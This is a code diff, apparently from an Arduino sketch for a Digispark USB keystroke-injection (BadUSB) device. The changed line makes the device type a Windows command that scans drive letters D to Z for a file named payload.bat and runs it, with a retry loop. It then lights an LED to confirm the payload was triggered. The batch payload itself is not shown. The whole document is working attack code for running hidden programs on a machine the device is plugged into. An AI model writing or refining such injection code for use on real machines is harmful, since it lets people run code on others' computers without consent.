@@ -22,7 +22,7 @@ void loop() {
   DigiKeyboard.delay(700);
 
   // 3. Resilient command with retry loop: scans drive letters until payload.bat is found
-  DigiKeyboard.print("cmd /c \"for /l %i in (1,1,10) do @(for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\\payload.bat (start \"\" /b %d:\\payload.bat & exit)) & ping -n 2 127.0.0.1 >nul\"");
+  DigiKeyboard.print("cmd /c \"for /l %i in (1,1,10) do @(for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\\payload.bat (call %d:\\payload.bat & exit)) & ping -n 2 127.0.0.1 >nul\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   // 4. Turn LED solid ON: visual confirmation that payload has been triggered
